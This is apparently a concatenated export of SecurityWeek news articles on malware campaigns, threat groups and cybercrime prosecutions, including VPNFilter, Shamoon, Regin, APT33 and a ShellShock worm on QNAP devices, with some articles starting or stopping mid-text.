iOS and OS X applications. “It’s difficult for iOS users or developers to be aware of this malware (or similar attacks) because it is deeply hidden, bypassing App Store code review. Because of these characteristics, Apple developers should always use Xcode directly downloaded from Apple, and regularly check their installed Xcode’s code signing integrity to prevent Xcode from being modified by other OS X malware,” Palo Alto Networks recommends.

The botnet is powered by a sophisticated piece of malware that researchers have dubbed VPNFilter based on the names of some folders created by the threat. Talos has worked with several other cybersecurity firms and law enforcement agencies to investigate VPNFilter. While the investigation is ongoing, an initial report has been published due to concerns that an attack involving the botnet may be imminent. Researchers believe a state-sponsored or state-affiliated threat actor is likely behind the attack and Russia has been named the main suspect due to code overlaps with the BlackEnergy malware, which has been attributed by many to the Kremlin. More than 500,000 hacked devices have been observed across 54 countries, but many infections have been spotted in Ukraine and their number continues to increase. The malware has compromised devices made by Linksys, MikroTik, Netgear, TP-Link and QNAP, and while experts have yet to identify the attack vector they are confident that no zero-day vulnerabilities are involved. VPNFilter is a modular piece of malware that has a wide range of capabilities. It can intercept data passing through the compromised device, including website credentials, and it can monitor the network for communications over the Modbus SCADA protocol. The malware, which uses Tor to communicate with a control panel, also has destructive capabilities that can be leveraged to make an infected device unusable. “The destructive capability particularly concerns us. This shows that the actor is willing to burn users' devices to cover up their tracks, going much further than simply removing traces of the malware. If it suited their goals, this command could be executed on a broad scale, potentially rendering hundreds of thousands of devices unusable, disabling internet access for hundreds of thousands of victims worldwide or in a focused region where it suited the actor's purposes,” Talos said in its report. Researchers are concerned that VPNFilter may be used for another massive attack on Ukraine not only due to the large number of infections and a separate command and control (C&C) infrastructure for devices in this country, but also because there are only a few weeks until Ukraine celebrates its Constitution Day. Last year, the NotPetya wiper attack was launched on the eve of Ukraine’s Constitution Day. NotPetya has been officially attributed to Russia by the U.S. and other countries and researchers have also linked the malware to BlackEnergy. The fact that the malware monitors Modbus communications, which are typically used for supervisory control and data acquisition (SCADA) systems, suggests that the attacker may also be targeting industrial control systems (ICS). Threat groups believed to be working for the Russian government have been known to launch attacks on ICS, including on Ukraine’s energy sector back in December 2016 using a piece of malware tracked as Industroyer and CRASHOVERRIDE. There are several other Russia-linked actors that have targeted industrial systems, including Dragonfly and Dymalloy. “VPNFilter is an expansive, robust, highly capable, and dangerous threat that targets devices that are challenging to defend. Its highly modular framework allows for rapid changes to the actor's operational infrastructure, serving their goals of misattribution, intelligence collection, and finding a platform to conduct attacks,” Talos said.

NukeBot, also known as Nuclear Bot, was first advertised on underground cybercrime forums in early December 2016, when it had been offered for sale for $2,500. However, NukeBot’s developer, a Russian-speaking individual who uses the online moniker “Gosya,” had a poor marketing strategy that led to him being banned from underground forums. According to IBM X-Force researchers, Gosya was introduced to hacking forums by a known member, but he failed to follow some important rules. Experts said he immediately started advertising his creation, without gaining the trust of the marketplace’s administrators and without giving them the chance to certify his malware. The developer of FlokiBot and other cybercriminals asked Gosya to prove the malware’s capabilities by providing technical details, but he became nervous and defensive. The members of cybercrime forums became even more suspicious when the NukeBot developer started advertising his product using different monikers on various websites. He even changed the malware’s name to Micro Banking Trojan before he was banned from forums. In mid-March, Gosya decided to make the NukeBot source code public. While Gosya may have appeared to be a scammer, IBM has confirmed that NukeBot is a legitimate banking Trojan, and an analysis conducted by Arbor Networks in December showed that Gosya’s product did in fact work right from the start. IBM said NukeBot is a modular Trojan that comes with a web-based administration panel and web injection capabilities. On the other hand, IBM said the malware is not capable of bypassing the company’s Trusteer Rapport product as claimed by Gosya. The developer may have hoped that leaking the source code will give others the chance to test his creation. This could also be a good marketing move as his Trojan might not only be used in attacks, but it will likely be increasingly discussed on security blogs, experts said. “With yet another malware source code out in the open, the most likely scenario is that NukeBot code will be recompiled and used by botnet operators,” said Limor Kessem, executive security advisor at IBM. “Parts of it may be embedded into other malware codes, and we are likely to see actual NukeBot fraud attacks in the wild in the coming months.” " }

Dubbed Spark, the malware differentiates itself from other versions of Alina in a number of ways, including its use of AutoIt as a loader. AutoIt is a BASIC-like scripting language designed for automating the Windows GUI and general scripting.   \"Typically compiled scripts are very simplistic,\" said Eric Merritt, Security Researcher at Trustwave. \"This is a much more advanced use of the technique. Due in-part to the ease of use of AutoIT, attackers can trivially alter the malware's file signature to avoid AV detection.\"   According to Trustwave, the AutoIt script contains functions to allocate space in memory, map a binary into that memory, fix the relocations and Import Address Table and execute the binary.    \"A malicious binary is concatenated into a variable 4,000 bytes at a time and the script's functions are used to load and execute it,\" Trustwave researchers noted in a blog post. \"The script is converted into a windows executable by running the utility Aut2Exe, which produces a new binary with the malware inside it.\"   Trustwave spotted the variant during an investigation of multiple breaches of automotive repair and maintenance businesses, noted Trustwave spokesperson Abby Ross. Based on the firm's investigation, the malware appears to have affected businesses across the country. Alina was first spotted by the security community in late 2012. There are a number of reasons Trustwave links Spark to Alina. For one, Alina has a blacklist of processes that are not scraped for credit card data. Spark has the same black list with additional applications added. Both have the same credit card data finding algorithm and use similar encoding schemes to hide the theft of credit card data. Like all the other versions of Alina, Spark also adds itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\hkcmd key in order to maintain persistence through reboot, according to the firm.   Spark also has similarities to the JackPOS malware, including the use of the AutoIt compiled script as a loader.   \"Both use similar blacklist approaches as well as custom functions for finding CC data [credit card],\" according to Trustwave. \"However, JackPOS almost exclusively attempts to masquerade as java or a java utility. It also either copies itself directly into the %APPDATA% directory or into a java based sub-directory inside %APPDATA%. JackPOS uses the MAC address as a bot ID and base64 encodes the CC data found on the system in order to obfuscate the exfiltration.\"   In addition to antivirus, retailers should protect themselves by isolating their payment networks, keeping systems responsible for accessing credit card data hardened via strict security policies and disabling any unused services, said Merritt. Network protections such as IDS/IPS and egress filtering can also detect infection and potentially limit automated exfiltration of the stolen credit cards, he added. " }

Two highly critical flaws were patched in recent months in the Drupal content management system (CMS). The security holes are tracked as CVE-2018-7600 and CVE-2018-7602, and they both allow remote code execution. Malicious actors started exploiting CVE-2018-7600, dubbed Drupalgeddon2, roughly two weeks after a patch was released and shortly after a proof-of-concept (PoC) exploit was made public. CVE-2018-7602, dubbed Drupalgeddon 3, was discovered during an analysis of CVE-2018-7600 by the Drupal Security Team and developer Jasper Mattsson, who also reported the original vulnerability. Hackers started exploiting CVE-2018-7602 immediately after the release of a patch. Cybercriminals have exploited the vulnerabilities to hijack servers and abuse them for cryptocurrency mining. Some websites have been targeted by botnets known to also be involved in distributed denial-of-service (DDoS) attacks. Researchers at security firm Malwarebytes recently conducted an analysis of client-side attacks involving Drupalgeddon2 and Drupalgeddon3, i.e. the threats pushed by the compromised sites to their visitors. Experts noticed that nearly half of the hacked Drupal sites had been running version 7.5.x of the CMS, while roughly 30 percent had been running version 7.3.x, which was last updated in August 2015. Unsurprisingly, more than 80 percent of the hacked sites had been serving cryptocurrency miners, mostly through Coinhive injections. “We collected different types of code injection, from simple and clear text to long obfuscated blurbs. It’s worth noting that in many cases the code is dynamic—most likely a technique to evade detection,” researchers said in a blog post.  Just over 12 percent of the attacks observed by Malwarebytes delivered RATs or password stealers disguised as web browser updates. Tech support scams accounted for nearly 7 percent of the client-side attacks spotted by the security firm. In these attacks, website visitors are typically redirected to a page that locks their browser and instructs them to call a “tech support” number. Malwarebytes says it has notified the organizations whose websites have been compromised. " }

The attackers also installed MacKeeper and directed victims to the Apple App Store page of a file downloader named Download Shuttle. The vulnerability exploited to install the adware was patched by Apple on August 13 with the release of OS X Yosemite 10.10.5. In a new blog post published this week, Malwarebytes reported seeing a new version of the previously analyzed installer. The new installer asks users to enter their admin password, after which it installs Genieo, VSearch and MacKeeper and redirects users to Download Shuttle. While this might seem the end of it, the installer uses a clever trick to access the Safari Extensions List in the Keychain. It does this by locating the “Allow” button on a Keychain alert and simulating a click on it. The Keychain alert is visible for less than a second before the Allow button is automatically clicked so victims are unlikely to become suspicious. The Mac OS X Keychain is a password management system that is used to store passwords and other sensitive information. In this case, the goal is to give the installer access to the Safari Extensions List in the keychain in order to install a Genieo Safari extension called “Leperdvil.” However, experts warn that the adware could be adapted to access users’ iCloud passwords and other data from the keychain. Genieo installers have been capable of installing shady Safari extensions for years, but Malwarebytes researchers believe this latest trick might be an attempt to bypass the new Safari extension handling mechanisms in the upcoming 10.11 El Capitan version of OS X. Malwarebytes says it has spotted the malicious code in almost every app installed by the Genieo installer at least since early June. A similar piece of adware was spotted by researchers at Webroot. Experts identified code designed to add an exception to the settings of ad blocker applications such as AdBlock Plus in order to ensure that the attackers’ ads would not get blocked. CSO reported that this Keychain attack method was also disclosed by researchers at Beirut-based identity management company MyKi. The experts developed a proof-of-concept (PoC) exploit that can steal passwords from the Keychain and sends them to the attacker via SMS. They reported their findings to Apple, but they haven’t received any response. However, it’s worth noting that this is not exactly a new attack method and it doesn’t involve an actual vulnerability. The technique, which has been known for several years, can only be leveraged by an application that obtains root privileges (either via a vulnerability, or by tricking the user into entering the system password). A security expert using the online moniker “noar” pointed out on Twitter that the technique was used back in 2011 by DevilRobber, a piece of OS X malware designed for Bitcoin mining and data theft. Once a piece of malware gains root access to a system, it’s not difficult for it to read Keychain passwords. In 2012, Finnish software developer Juuso Salonen released a PoC tool, named “keychaindump,” capable of reading the plaintext Keychain passwords of logged-in users. The keychaindump tool still works today, noar noted. “There is a design compromise in Apple’s keychain implementation that sacrifices some security for a lot of usability,” Salonen wrote in a blog post when he released his tool. “As a result, the root user is able to read all keychain secrets of logged-in users, unless they take extra steps to protect themselves. I’m sure Apple is perfectly aware of the security implications, and made the bargain intentionally.” Apple has not responded to SecurityWeek’s request for comment by the time of publication. " }

The report covers a wide range of topics, including cyber-dependent crime, online child exploitation, payment fraud, criminal markets, the convergence of cyber and terrorism, cross-cutting crime factors, and the geographical distribution of cybercrime. According to the police agency, we’re seeing a “global epidemic” in ransomware attacks. When it comes to critical infrastructure attacks, Europol pointed out that the focus is often on the worst case scenario – sophisticated state-sponsored actors targeting supervisory control and data acquisition (SCADA) and other industrial control systems (ICS) in power plants and heavy industry organizations.  However, these are not the most likely and most common types of attacks – at least not from a law enforcement perspective as they are more likely to be considered threats to national security. More likely attacks, based on reports received by law enforcement agencies in Europe, are ones that don’t require attackers to breach isolated networks, such as distributed denial-of-service (DDoS) attacks, which often rely on easy-to-use and widely available tools known as booters or stressers. While these types of attacks may not lead to a shutdown of the power grid, they can still cause serious disruptions to important utilities and services. " }

Dubbed \"Operation Saffron Rose\" by FireEye, the report analyzes the group, which FireEye researchers are dubbing the Ajax Security Team, and suggests that the attackers’ methodologies have “grown more consistent with other advanced persistent threat (APT) actors in and around Iran following cyber attacks against Iran in the late 2000s.”   The Ajax Security Team uses malware tools that do not appear to be publicly available, the report said, and it is unclear to the researchers if the group operates alone or if they are a part of a larger coordinated effort.  “We have seen this group leverage varied social engineering tactics as a means to lure their targets into infecting themselves with malware,” the report said. “Although we have not observed the use of exploits as a means to infect victims, members of the Ajax Security Team have previously used publicly available exploit code in web site defacement operations.”  The attackers also circulate anti-censorship software that has been infected with malware.   “The objectives of this group are consistent with Iran’s efforts at controlling political dissent and expanding offensive cyber capabilities, but we believe that members of the group may also be dabbling in traditional cybercrime,” the report explained. “This indicates that there is a considerable grey area between the cyber espionage capabilities of Iran’s hacker groups and any direct Iranian government or military involvement.”  \"There is an evolution underway within Iranian-based hacker groups that coincides with Iran's efforts at controlling political dissent and expanding its offensive cyber capabilities,\" said Nart Villeneuve, senior threat intelligence researcher at FireEye. \"We have witnessed not only growing activity on the part of Iranian-based threat actors, but also a transition to cyber-espionage tactics. We no longer see these actors conducting attacks to simply spread their message, instead choosing to conduct detailed reconnaissance and control targets' machines for longer-term initiatives.\"  According to the report, FireEye Labs recently observed the Ajax Security Team conducting multiple cyber-espionage operations against companies in the defense industrial base within the U.S. The group also targets local Iranian users of Proxifier or Psiphon, which are anti-censorship technologies that bypass Iran's Internet filtering system.   FireEye was able to indentify 77 victims from one command-and-control (CnC) server found while analyzing malware samples disguised as Proxifier or Psiphon. According to victim data collected by FireEye:  •\t44 had their time zone set to \"Iran Standard Time,\" and 37 of those also had their language set to Persian.  •\tOf the 33 victims that did not have an Iranian time zone setting, 10 had Persian language settings  •\t12 of the victims had either Proxifier or Psiphon installed or running (all 12 had a Persian language setting, and all but one had their time zone set to \"Iran Standard Time\")  Over the past year, another group called Izz ad-Din al-Qassam launched \"Operation Ababil,\" a series of DDoS attacks against many U.S. financial institutions including the New York Stock Exchange.  “While the relationship between actors such as the Ajax Security Team and the Iranian government is unknown, their activities appear to align with Iranian government political objectives,” the report concluded.  “While the Ajax Security Team’s capabilities remain unclear, we know that their current operations have been somewhat successful as measured by the number of victims seen checking into to an Ajax Security Team controlled CnC server. We believe that if these actors continue the current pace of their operations they will improve their capabilities in the mid-term.\" \"Iran has been a big concern for the US for some time, with their development of nuclear power means and the several year cyber attack against their government networks, be it from the U.S. or other countries,\" Adam Kujawa, head of Malware Intelligence at Malwarebytes, told SecurityWeek in an emailed statement.  \"While the malware being used by Iran is unique, it's functionality is not novel, meaning that while it appears to have a cyber defense/attack presence, it is still far behind other countries like the U.S. or China,\" Kujawa continued. \"Whether a nation state or a crime ring, these groups are smart, sophisticated, and well-funded,\" added Eric Chiu, president and co-founder of HyTrust. \"It also confirms that attacks are being carried out more and more from the inside -- many of these groups use social engineering and APTs to steal employee credentials to gain access to corporate networks where they can install malware to steal data or cause damage. Given this emerging trend, companies really need to shift to an inside-out model of security and assume the bad guy is already on the network.\" The full report is available online.   *Updated with additional commentary.

Senakh has pleaded guilty to conspiracy to violate the Computer Fraud and Abuse Act (CFAA) and conspiracy to commit wire fraud. The man was indicted by U.S. authorities in January 2015 and he was arrested in Finland in August 2015. Finland extradited the suspect to the United States in January 2016. Sentencing is scheduled for August 3. According to the Department of Justice, Senakh has admitted taking part in a criminal enterprise that made millions of dollars by infecting tens of thousands of servers with malware. The cybercriminals used the Linux malware Ebury to power a botnet that helped them make money through click-fraud and email spam operations. Senakh said he registered the domains used for the botnet’s command and control (C&C) infrastructure. He admitted profiting from the traffic generated by the Ebury botnet. The Ebury malware was first spotted in 2011. ESET, Germany’s CERT‑Bund, the Swedish National Infrastructure for Computing, the European Organization for Nuclear Research (CERN) and other organizations published an analysis of the Ebury malware in February 2014. The malware, tracked by ESET as Linux/Ebury, was described by the security firm as a sophisticated OpenSSH backdoor and credential stealer. CERT-Bund reported spotting thousands of infected systems across more than 60 countries, including in the United States, Germany, France, Italy, U.K., Netherlands, Russia, Ukraine, Mexico and Canada. Since Ebury had rootkit capabilities, experts advised users at the time to reinstall the operating system on compromised machines instead of attempting to clean the infection. Earlier this month, another Russian national, Mark Vartanyan, aka “Kolypto,” pleaded guilty in a U.S. court to charges related to the development and distribution of the Citadel Trojan. " }

The Xsser mRAT is spread through man-in-the-middle and phishing attacks, according to Akamai's Prolexic Security Engineering and Research Team (PLXsert). The researchers believe the malware is being used by an organized group targeting owners of specific phones and software vendors with the goal of stealing credentials, hijacking browsing sessions or execute code at the compromised devices. The activity began in September and has been observed mostly in Asia. The attacks have focused on software vendors, software-as-a-service (SaaS) providers and Internet service providers, and have also attempted to serve malicious applications via phishing techniques or by impersonating legitimate websites. Other attacks use phishing to trick users into downloading applications being hosted on third-party repositories.  David Fernandez, manager of the Akamai PLXsert team, told SecurityWeek that the attacks are not widespread as of yet. As of now, the command-and-control has been taken down, the advisory notes.  While the malware previously only impacted Android, the latest variant of the malware affects jailbroken iOS devices, according to the advisory. \"The app is installed via a rogue Cydia repository and once the bundle has been installed and executed, it gains persistence,\" the advisory notes. \"It then makes server-side checks and proceeds to exfiltrate data from the user’s device and executes remote commands from its commandand-control (C2) server.\" \"Sophisticated malicious actors are targeting unsuspecting mobile device users,\" said Stuart Scholly, senior vice president and general manager of the Security Business Unit at Akamai, in a statement. \"Attackers are impersonating or bypassing Google and Apple app stores and using social engineering to trick users into downloading unverified apps that install malicious applications such as the Xsser remote access Trojan onto a user’s mobile device.

{ "_id" : { "$oid" : "5b27c3e56cefc41c844ab23f" }, "Category" : "Malware", "Title" : "GPU Malware Not Difficult to Detect: Intel", "Address" : "https://www.securityweek.com/gpu-malware-not-difficult-detect-intel-security", "Date" : "September 01, 2015", "Article" : "Malware that leverages a computer’s graphics processing unit (GPU) made headlines earlier this year when researchers developed several experimental threats designed to use the GPU for enhanced stealthiness. However, experts from Intel Security believe such malware still leaves traces that can be picked up by endpoint protection solutions. Malware that uses the GPU has been around for several years; the most common of these threats are Trojans that harness the power of the GPU for Bitcoin mining. In May, researchers released source code for three pieces of malware designed to leverage the GPU: a keylogger (Demon), a Linux user-mode rootkit (Jellyfish), and a Windows remote access tool (WIN_JELLY). These programs demonstrated that GPU-based malware can maintain persistence through warm reboots, it can access CPU host memory via Direct Memory Access (DMA), and it can delete the CPU host files after installation. Experts have also pointed out that there aren’t many GPU analysis tools available. In its McAfee Labs Threats Report for August 2015, Intel Security analyzed each of these points in an effort to provide additional context on the threat posed by GPU malware and available defenses. Intel Security has pointed out that applications designed to access the GPU need a parent process that runs on the CPU. The activities carried out by this parent process in the case of regular malware, such as reading and writing memory, can be detected by security products. By accessing the CPU host memory from the GPU, protections can be bypassed and malicious activity can remain hidden. However, when delivering the payload, physical memory must be mapped to the GPU, which requires Ring 0 access on the operating system. This adds to the malware’s footprint on the host and is covered by existing kernel protections, Intel Security said. While GPU malware can delete the kernel driver and the parent usermode process following installation in an effort to avoid detection, this leaves the code running on the GPU orphaned. On Windows systems, this leads to the initiation of a Timeout Detection and Recovery (TDR) process that resets the graphics card, researchers noted. Modifying TDR settings to prevent this from happening would be suspicious since Microsoft recommends such changes only for testing and debugging purposes. The researchers who developed Jellyfish noted that the malware can maintain persistence across warm reboots. However, in the case of the proof-of-concept rootkit, while the executable code remains stored in the GPU after reboot, it cannot be executed without a host process that is also launched at system startup. Intel Security agrees that there aren’t many GPU forensics and malware analysis tools. However, the company has pointed out that while such tools would be useful for understanding the inner workings of GPU-based malware, endpoint security products should still be able to detect threats based on other indicators of attack. “GPU threats are a real concern. But this type of attack has not reached perfect storm status. On one hand reverse engineering and forensic analysis of such threats is much more complex and challenging than their pure CPU counterparts, and this may result in an infection going unnoticed for a longer period. By moving part of malicious code off of the CPU and host memory, the detection surface is reduced—making it more difficult for host-based defenses to detect attacks,” Intel Security noted in its report. “On the other hand, the detection surface has not been completely eliminated. At a minimum, trace elements of malicious activity remain, allowing endpoint security products to detect and remediate the threat.” “Undoubtedly there will be advancements made in this area by both attackers and defenders. If nothing else, the recent attention to this area has resulted in the security community’s reevaluating its current posture and exploring ways to improve upon it,” wrote the authors of the report.

TNT Express, which FedEx acquired last year for $4.8 billion, was one of several major companies whose systems were infected with NotPetya malware (also known as Nyetya, PetrWrap, exPetr, GoldenEye, and Diskcoder.C) in late June. The company reported a few weeks after the attack that the incident had a significant impact on its operations and communications. FedEx admitted at the time that it was possible TNT would not be able to fully restore all affected systems and recover all the critical business data encrypted by NotPetya. “The worldwide operations of TNT Express were significantly affected during the first quarter by the June 27 NotPetya cyberattack. Most TNT Express services resumed during the quarter and substantially all TNT Express critical operational systems have been restored. However, TNT Express volume, revenue and profit still remain below previous levels,” the company said on Tuesday. “Operating results declined due to an estimated $300 million impact from the cyberattack, which was partially offset by the benefits from revenue growth, lower incentive compensation accruals and ongoing cost management initiatives,” it added. Hurricane Harvey, a category 4 hurricane that hit Texas in late August, also had a negative impact on the company’s earnings in the latest quarter. FedEx reported earnings of $2.19 per diluted share compared to $2.65 per diluted share one year ago. The company reported a revenue of $15.3 billion and reaffirmed its commitment to improve the operating income of its largest business, FedEx Express, by $1.2 billion to $1.5 billion by 2020 compared to fiscal 2017. FedEx is not the only company whose bottom line was impacted by NotPetya, a piece of malware that initially appeared to be ransomware and later turned out to be a wiper. Financial reports published in August by Danish shipping giant AP Moller-Maersk, British consumer goods company Reckitt Benckiser, voice and language solutions provider Nuance Communications, Mondelez International, and French construction giant Saint-Gobain reported losses of millions of dollars due to the cyberattack. The highest sum was announced at the time by Saint Gobain, which expected losses to rise to nearly $400 million. " }

Sentencing is scheduled for September 21. Ruslans Bondars, a citizen of the former USSR, had been residing in Riga, Latvia, when he was arrested in May 2017 along with Russian national Jurijs Martisevs. Martisevs was on a trip to Latvia when he was taken into custody. Bondars and Martisevs were accused of running the Scan4You service, which helped cybercriminals test their malware to ensure that it would not be detected by cybersecurity products. Bondars was convicted on Wednesday on one count of conspiracy to violate the Computer Fraud and Abuse Act (CFAA), one count of conspiracy to commit wire fraud, and one count of computer intrusion with intent to cause damage and aiding and abetting. Martisevs pleaded guilty in March to conspiracy, for which he faces up to 5 years in prison, and aiding and abetting computer intrusions, for which he faces 10 years in prison. His sentencing is scheduled for July. According to Trend Micro, whose experts helped authorities investigate Scan4You, the service was launched in 2009 and was active until the arrests of its operators. An unnamed individual from Great Falls, Virginia, was also allegedly involved. Bondars (known online as b0rland and Borland) and Martisevs (known online as Garrik) started their cybercrime career in at least 2006, and they managed to turn Scan4You into one of the largest counter antivirus services, with thousands of customers. Scan4You allowed cybercriminals to conduct 100,000 scans per month for $30 and $0.15 for single scans. The service was also popular among counter antivirus resellers such as Indetectables, RazorScanner and reFUD.me. Trend Micro says Bondars and Martisevs were also involved with a shady online pharmacy and launched their own banking malware campaigns. However, they did a poor job at hiding their identity. Bondars, for instance, used the same Gmail account to register command and control (C&C) domains for his banking malware and to create a Facebook account. The Gmail account contained his real name and profile photo. According to authorities, Scan4You was used to test the malware involved in the massive 2013 breach at the U.S. retailer Target. The service was also used in the development of Citadel, a banking trojan that infected over 11 million computers worldwide, which resulted in over $500 million in fraud-related losses. " }

The latest waves of attacks involving the disk-wiping malware Shamoon, aka Disttrack, have been analyzed by several security firms. IBM reported recently that the attackers delivered Shamoon using weaponized documents, and researchers have found connections to several other Iran-linked threat actors, including Charming Kitten (aka Newscaster, NewsBeef), Rocket Kitten, Magic Hound (aka Timberworm, COBALT GYPSY), and Greenbug. It has been known that the Shamoon 2 attacks involved stolen credentials and that the threat actors had access to the targeted organizations’ networks well before the malware initiated its destructive routines. Symantec reported that the Magic Hound and Greenbug groups may have helped conduct reconnaissance, including stealing credentials and creating persistent backdoors. In a blog post published on Monday, Palo Alto Networks said it managed to determine exactly how the stolen credentials were used by the attackers. According to researchers, the hackers first compromised a single system on the network using the Remote Desktop Protocol (RDP) and stolen credentials. This machine, which became their distribution server, stored the attackers’ tools and malware. From this distribution server, the attackers attempted to connect to named systems on the network using compromised credentials and infect them with the Shamoon malware. From the named systems, the malware identified up to 256 IP addresses on the local network and spread to those devices. Then, from the newly infected systems, the malware attempted to spread to other 256 IP addresses on the local network. Experts believe the information on named hosts was obtained directly from Active Directory on a domain controller, which also suggests that the attackers used legitimate credentials in their operations. “This rudimentary, but effective, distribution system can enable Disttrack to propagate to additional systems from a single, initially compromised system in a semi-automated fashion,” researchers said. Palo Alto Networks has also found more evidence linking the Shamoon attacks to the Magic Hound group. According to the security firm, one of the command and control (C&C) servers used by Magic Hound and a server hosting Shamoon files used IP addresses from the same range, namely 45.76.128.x. Another similarity is related to the use of PowerShell and Meterpreter. Palo Alto Networks agrees with Symantec on the theory that Magic Hound may have conducted the reconnaissance phase of the Shamoon 2 attacks. " }

The malware, which has been around since at least 2008, has been used by a threat group to target private individuals and organizations in sectors such as hospitality, telecoms, energy, research, and aviation. A report published by Symantec in November 2014 revealed that most Regin infections had been spotted in Russia (28%) and Saudi Arabia (24%), but the malware had also been seen in Mexico, Ireland, India, Afghanistan, Iran, Belgium, Austria and Pakistan. News website The Intercept linked the platform to US and British intelligence agencies. The malware, apparently referenced in documents leaked by Edward Snowden, is said to have been used in attacks against government agencies in the EU and the Belgian telecoms company Belgacom. Regin, considered one of the most sophisticated espionage tools discovered to date, has a six-stage architecture. Attacks start with a dropper that installs the malware onto the targeted machine. In the first stages, drivers are loaded and the malware’s internal services are configured, while in the last stage the main payloads and deployed. The platform has a modular structure that allows its operators to add and remove features depending on the targeted entity. Symantec has kept a close eye on the threat and today revealed that it has uncovered 49 new modules, which brings the total number to 75. However, experts have pointed out that other such components likely exist based on references found in the analyzed modules. An updated version of the security firm’s original report reveals that the newly discovered modules can be used for logging, keylogging, impersonation, file system forensics and monitoring, network packet capturing, hooking, system and network information harvesting, credentials theft, email reading and writing, and many other functions. According to Symantec, Regin is backed by an extensive command and control (C&C) infrastructure that involves peer-to-peer (P2P) communications between infected computers. “Regin’s P2P communications capability sees each Regin infection assigned a virtual IP address, forming a virtual private network (VPN) on top of the physical network of the infected computer,” Symantec explained in a blog post. “This P2P capability allows the attackers to maintain deep access to critical assets within compromised organizations and mask core infrastructure belonging to the group. Traffic between nodes can be configured to match expected protocols based on where the nodes are placed on a network, adding a further degree of stealth to communications.” Communication between the various Regin modules is powered by a custom-built remote procedure call (RPC) mechanism that enables the attackers to remotely install, update, and configure modules. “Despite the threat’s exposure last year, it is unlikely that the group behind this malware has ceased operations,” Symantec noted. “Its track record and available resources mean it is probable that the group will re-equip itself with a new threat or upgrade Regin in a bid to evade detection. The latter is the most likely course of action, given the time it would take to develop an equally capable malware framework from scratch.” Researchers believe Regin is far more sophisticated than other malware and it might be used as a source of inspiration by less advanced threat groups looking to improve their arsenal.

The threat actor, tracked by FireEye as APT33, is believed to have been around since at least 2013. Since mid-2016, the security firm has spotted attacks aimed by this group at the aviation sector, including military and commercial aviation, and energy companies with connections to petrochemical production. Specifically, the cyberspies targeted a U.S. organization in the aerospace sector, a Saudi Arabian business conglomerate with aviation holdings, and a South Korean firm involved in oil refining and petrochemicals. In recent attacks, the hackers used job vacancies at a Saudi Arabian petrochemical firm to target the employees of organizations in South Korea and Saudi Arabia. “We assess the targeting of multiple companies with aviation-related partnerships to Saudi Arabia indicates that APT33 may possibly be looking to gain insights on Saudi Arabia’s military aviation capabilities to enhance Iran’s domestic aviation capabilities or to support Iran’s military and strategic decision making vis a vis Saudi Arabia,” FireEye said in a blog post. “We believe the targeting of the Saudi organization may have been an attempt to gain insight into regional rivals, while the targeting of South Korean companies may be due to South Korea’s recent partnerships with Iran’s petrochemical industry as well as South Korea’s relationships with Saudi petrochemical companies,” the company added. According to FireEye, the cyber espionage group sent hundreds of spear phishing emails last year. They set up several domains made to look as if they belonged to Saudi aviation firms and international organizations that work with them, including Alsalam Aircraft Company, Boeing and Northrop Grumman Aviation Arabia. The malware used by the group includes a dropper tracked by FireEye as DROPSHOT, a wiper named SHAPESHIFT, and a backdoor called TURNEDUP. DROPSHOT was previously analyzed by Kaspersky, which tracks it as StoneDrill. The StoneDrill malware was tied by Kaspersky to the notorious Shamoon 2 and Charming Kitten (aka Newscaster and NewsBeef), a threat actor believed to be operating out of Iran. FireEye has also linked APT33 to Iran based on connections to the “Nasr Institute,” which is said to be Iran’s “cyber army”, attacks launched during Iranian working hours, and the use of Iranian hacking tools. Iran appears to have several cyber espionage groups, including Rocket Kitten, Cobalt Gypsy (Magic Hound), Charming Kitten and CopyKittens. " }

According to a report in Reuters, the agency sent a private notice to healthcare companies stating the industry \"is not as resilient to  cyber intrusions compared to the financial and retail sectors, therefore the possibility of increased cyber intrusions is likely.\" The data these firms possess could be a potential boon to hackers. In a report last year, Dell SecureWorks outlined the underground market for pieces of health insurance information ranging from contract numbers to the type of plan a customer has purchased. These packages of data, which can also feature verified bank account numbers and other information, are known in the cyber-underground as 'fullz.' Last year, fullz tended to go for about $500 depending on what was included, with health insurance credentials going for about $20 each with an additional $20 added whenever there is a dental, vision or chiropractic plan associated with the health plan, according to Dell SecureWorks. News of the FBI warning comes after a cyber-security exercise for the healthcare industry known as the 'CyberRX Initiative.' The initiative is the result of a joint effort by the Health Information Trust Alliance (HITRUST) and the U.S. Department of Health and Human Service (HHS) aimed at determining how prepared organizations are to address cyber-threats. The first exercise was conducted during a seven-hour period on April 1, and the results were released Monday. During the exercise, the organizations demonstrated varying levels of ability to use threat intelligence, communicate internally and work with external partners in the industry and in government. The \"weakness isn't necessarily on technology implementations, it's the ability to coordinate and collaborate across the myriad of participants in healthcare,\" Roy Mellinger, WellPoint's vice president and CISO, said in a phone briefing on the CyberRX results on Monday, SecurityWeek reported. In February, the SANS Institute and security vendor Norse released a report on the healthcare industry, concluding \"personal health care information (PHI) and organization intellectual property, as well as medical billing and payment organizations, are all increasingly at risk of data theft and fraud.\" \"Poorly protected medical endpoints, including personal health devices, become gateways, exposing consumers’ personal computers and information to prowling cybercriminals,\" according to the report. \"Healthcare networks are not typically built with inherent mechanisms for detecting leaks or breaches in the way that financial networks might be,\" said Trey Ford, global strategist at Rapid7. \"When payment information like credit and debit cards are stolen and moved to the black market, the payment system is designed to pinpoint a 'common point of purchase' so affected accounts can be quickly identified and isolated.\" " }

The malware is distributed through the exploitation of the GNU Bash vulnerability known as ShellShock. Cybercriminals started exploiting ShellShock to gain full access to the contents of NAS devices developed by Taiwan-based QNAP shortly after the existence of the vulnerability came to light. The vendor released updates to address the flaw in its product at the beginning of October, but because the patches are not easy to apply many systems remain vulnerable. The SANS Institute reports that a worm is currently spreading among QNAP devices, which run an embedded Linux operating system, by exploiting the Bash vulnerability. \"The attack targets a QNAP CGI script, '/cgi-bin/authLogin.cgi', a well known vector for Shellshock on QNAP devices,\" Johannes Ullrich of the SANS Internet Storm Center wrote in a blog post. \"This script is called during login, and reachable without authentication. The exploit is then used to launch a simple shell script that will download and execute a number of additional pieces of malware.\" One of the worm's malicious components is designed for click fraud and it targets the online advertisement network JuiceADV. The threat also sets up backdoors on infected devices by creating an SSH server on port 26, by adding a user (named \"request\") with administrator privileges, and by copying some CGI scripts with backdoor functionality to the \"cgi-bin\" directory. The malware modifies the \"autorun.sh\" file in order to run the backdoors on reboot. Researchers have also noticed that the worm sets the DNS server on the infected machine to 8.8.8.8, which is actually Google's DNS server. It's possible that the attackers do this in order to get a more reliable DNS server, since as Ullrich explains, QNAP devices sometime use internal DNS servers which aren't 